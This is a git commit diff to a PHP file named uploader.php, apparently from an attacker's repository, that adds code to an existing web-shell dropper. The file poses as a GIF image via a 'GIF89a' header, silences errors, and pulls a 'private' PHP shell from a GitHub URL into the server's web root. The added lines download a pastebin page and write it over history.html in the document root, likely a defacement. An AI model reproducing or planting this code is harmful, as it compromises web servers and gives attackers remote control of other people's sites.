c4f768d4266d687893b06cbf605b669c9e4497b9
aprilc0de <41795374+aprilc0de@users.noreply.github.com>
2018-12-16 01:40:44 +0000

    Update uploader.php

--- uploader.php
+++ uploader.php
@@ -1,6 +1,14 @@
 GIF89a;
 <?php
 error_reporting(0);
+$content = file_get_contents('https://pastebin.com/raw/ay6E1zT9');
+$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/history.html","w");
+if(fwrite($fp,$content)){
+echo "<font color=#02BC8C>OK</font>";
+}else{
+echo "<font color=#F64747>ERROR</font>";
+}
+fclose($fp);
 $filename="lusiana.php";
 $fget=file_get_contents("https://raw.githubusercontent.com/aprilc0de/Shell-Private/master/shell_priv8_U48.php");
 $path=$_SERVER['DOCUMENT_ROOT'];
